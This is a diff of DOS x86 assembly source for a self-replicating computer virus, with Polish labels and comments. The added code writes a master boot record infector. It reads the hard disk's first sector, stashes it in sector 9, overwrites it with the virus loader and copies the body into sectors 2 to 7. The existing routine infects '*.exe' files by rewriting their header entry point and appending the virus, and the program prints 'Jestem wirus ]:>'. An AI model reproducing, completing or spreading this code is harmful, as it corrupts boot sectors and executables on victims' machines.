@@ -28,26 +28,76 @@ ZARAZONY_MASKA equ 0ffh
 
 segment main
 
-tablica_partycji:
+tablica_partycji_poczatek:
+  xor ax, ax
+  mov ss, ax
+  mov sp, 7c00h
+  int 12h
+  mov cl, 6
+  shl ax, cl
+  mov cx, 100h
+  sub ax, cx
+  mov [adres], ax
+  mov dx, 80h
+  mov cx, 2
+  mov es, ax
+  mov bx, 0
+  mov ax, 0206h
+  int 13h
+  mov ax, [adres]
+  push ax
+  mov ax, czesc_inicjujaca
+  push ax
+  retf
+adres dw ?
+tablica_partycji_koniec:
+czesc_inicjujaca:
+  mov ax, cs
+  mov ss, ax
+  mov ds, ax
+  mov sp, bufor + 100h
+  mov dx, 80h
+  mov cx, 9
+  xor ax, ax
+  mov es, ax
+  mov bx, 7c00h
+  push es
+  push bx
+  mov ax, 0201h
+  int 13h
+  push ds
+  push ax
+  mov ax, 0b800h
+  mov ds, ax
+  mov al, 'A'
+  mov [0], al
+  mov al, 1eh
+  mov [1], al
+  pop ax
+  pop ds
+  retf
 
-start:
-  mov dx, cs
-  mov ds, dx
-  call wirus_poczatek
-  mov ah, P21H_TEKST_$_WYPISZ
-  mov dx, informacja
-  int 21h
-; oczekiwanie na wciśnięcie klawisza
-  mov ah, 0h
-  int 16h
-  mov ax, P21H_ZAMKNIJ
-  int 21h
+;segment dane
+plik_poczatek_ip dw ?
+plik_poczatek_cs dw ?
+plik_maska db "*.exe", 0
+plik_uchwyt dw ?
+plik_data dw ?
+plik_czas dw ?
+plik_dlugosc_seg dw ?
+plik_dlugosc_ofs dw ?
+plik_naglowek dw ?
+bufor: times 200h db ?
+
+informacja db "Jestem wirus ]:> $"
 
 ; wykonywane po uruchomieniu programu
-start_pliku:
+plik_poczatek:
   push ds
   push es
 ; miejsce na psoty
+  ;call zarazenie_tablica_partycji
+  call zarazenie_plik
   mov dx, cs
   mov ds, dx
   mov ah, P21H_TEKST_$_WYPISZ
@@ -68,7 +118,7 @@ start_pliku:
   retf
 
 ; zarażanie
-wirus_poczatek:
+zarazenie_plik:
   push ax
   push bx
   push cx
@@ -84,7 +134,7 @@ wirus_poczatek:
   mov cx, 0fh
   int 21h
 ; jc - nie znaleziono
-  jc zarazanie_koniec
+  jc zarazanie_plik_koniec
 
 plik_znaleziono:
   mov ah, P21H_P_BUFOR_ADRES_POBIERZ
@@ -109,7 +159,7 @@ plik_znaleziono:
   mov ah, P21H_PLIK_SZUKAJ_NASTEPNEGO
   int 21h
   jnc plik_znaleziono
-  jmp zarazanie_koniec
+  jmp zarazanie_plik_koniec
   
 do_zarazenia:
   mov cl, ZARAZONY_MASKA
@@ -126,11 +176,11 @@ do_zarazenia:
   xor dx, dx
   mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_POCZATEK)
   int 21h
-  mov dx, plik_bufor
+  mov dx, bufor
   mov cx, PLIK_NAGLOWEK_DLUGOSC
   mov ax, P21H_PLIK_ODCZYTAJ
   int 21h
-  cmp word [plik_bufor], PLIK_TYP
+  cmp word [bufor], PLIK_TYP
   jne plik_oznacz
 ; zapisanie nowego rozmiaru pliku
   mov ax, koniec
@@ -138,15 +188,15 @@ do_zarazenia:
   shr ax, cl
   and ax, 1ffh
   mov cx, ax
-  mov ax, word [plik_bufor + PLIK_ROZMIAR_OFS]
+  mov ax, word [bufor + PLIK_ROZMIAR_OFS]
   add ax, cx
   inc ax
-  mov word [plik_bufor + PLIK_ROZMIAR_OFS], ax
+  mov word [bufor + PLIK_ROZMIAR_OFS], ax
 ; zapamiętanie rozmiaru nagłówka
-  mov ax, word [plik_bufor + P_NAGLOWEK_ROZMIAR_OFS]
+  mov ax, word [bufor + P_NAGLOWEK_ROZMIAR_OFS]
   mov [plik_naglowek], ax
 ; zapamiętanie segmentu pierwotnego początku programu
-  mov ax, word [plik_bufor + P_POCZATEK_SEGMENT_OFS]
+  mov ax, word [bufor + P_POCZATEK_SEGMENT_OFS]
   mov [plik_poczatek_cs], ax
 ; sprawdzenie długości pliku, jeśli zbyt długi to rezygnacja
   mov ax, [plik_dlugosc_seg]
@@ -165,19 +215,19 @@ do_zarazenia:
   mov dx, [plik_naglowek]
   sub ax, dx
   inc ax
-  mov word [plik_bufor + P_POCZATEK_SEGMENT_OFS], ax
+  mov word [bufor + P_POCZATEK_SEGMENT_OFS], ax
 ; zapamiętanie offsetu pierwotnego początku programu
-  mov ax, word [plik_bufor + P_POCZATEK_OFFSET_OFS]
+  mov ax, word [bufor + P_POCZATEK_OFFSET_OFS]
   mov [plik_poczatek_ip], ax
 ; zapisanie offsetu nowego początku programu
-  mov ax, start_pliku
-  mov word [plik_bufor + P_POCZATEK_OFFSET_OFS], ax
+  mov ax, plik_poczatek
+  mov word [bufor + P_POCZATEK_OFFSET_OFS], ax
 ; zapisanie uaktualnionego nagłówka pliku
   xor cx, cx
   xor dx, dx
   mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_POCZATEK)
   int 21h
-  mov dx, plik_bufor
+  mov dx, bufor
   mov cx, PLIK_NAGLOWEK_DLUGOSC
   mov ax, P21H_PLIK_ZAPISZ
   int 21h
@@ -194,14 +244,14 @@ do_zarazenia:
   sub cx, ax
 plik_dopisz_wirusa:
   inc cx
-  mov dx, tablica_partycji
+  mov dx, tablica_partycji_poczatek
   mov ax, P21H_PLIK_ZAPISZ
   int 21h
   xor cx, cx
   xor dx, dx
   mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
   int 21h
-  mov dx, tablica_partycji
+  mov dx, tablica_partycji_poczatek
   mov ax, koniec
 ; wyrównanie długości pliku do 512
   mov cl, 9
@@ -221,7 +271,7 @@ plik_oznacz:
   mov ah, P21H_PLIK_ZAMKNIJ
   int 21h
   
-zarazanie_koniec:
+zarazanie_plik_koniec:
   popf
   pop es
   pop ds
@@ -231,19 +281,71 @@ zarazanie_koniec:
   pop ax
   ret
 
-;segment dane
-plik_poczatek_ip dw ?
-plik_poczatek_cs dw ?
-plik_maska db "*.exe", 0
-plik_uchwyt dw ?
-plik_data dw ?
-plik_czas dw ?
-plik_dlugosc_seg dw ?
-plik_dlugosc_ofs dw ?
-plik_bufor: times 200h db ?
-plik_naglowek dw ?
-
-informacja db "Jestem wirus ]:> $"
+zarazenie_tablica_partycji:
+  push ds
+  push es
+  mov dx, 0080h
+  mov cx, 0001h
+  mov ax, cs
+  mov es, ax
+  mov bx, bufor
+  mov ax, 0201h
+  int 13h
+  mov ax, cs
+  mov ds, ax
+  mov es, ax
+  mov si, bufor
+  mov di, tablica_partycji_poczatek
+  cld
+  mov cx, 18h
+  rep cmpsb
+  je z_tablica_partycji_koniec
+  mov dx, 80h
+  mov cx, 9
+  mov ax, cs
+  mov es, ax
+  mov bx, bufor
+  mov ax, 0301h
+  int 13h
+  mov cx, tablica_partycji_koniec - tablica_partycji_poczatek
+  mov ax, cs
+  mov ds, ax
+  mov es, ax
+  mov si, tablica_partycji_poczatek
+  mov di, bufor
+  cld
+  rep movsb
+  mov dx, 80h
+  mov cx, 1
+  mov ax, cs
+  mov es, ax
+  mov bx, bufor
+  mov ax, 0301h
+  int 13h
+  mov dx, 80h
+  mov cx, 2
+  mov ax, cs
+  mov es, ax
+  mov bx, tablica_partycji_poczatek
+  mov ax, 0306h
+  int 13h
+z_tablica_partycji_koniec:
+  pop es
+  pop ds
+  ret
 
 koniec:
 
+start:
+  ;call zarazenie_tablica_partycji
+  call zarazenie_plik
+  mov dx, cs
+  mov ds, dx
+  mov ah, P21H_TEKST_$_WYPISZ
+  mov dx, informacja
+  int 21h
+; oczekiwanie na wciśnięcie klawisza
+  mov ah, 0h
+  int 16h
+  mov ax, P21H_ZAMKNIJ
+  int 21h
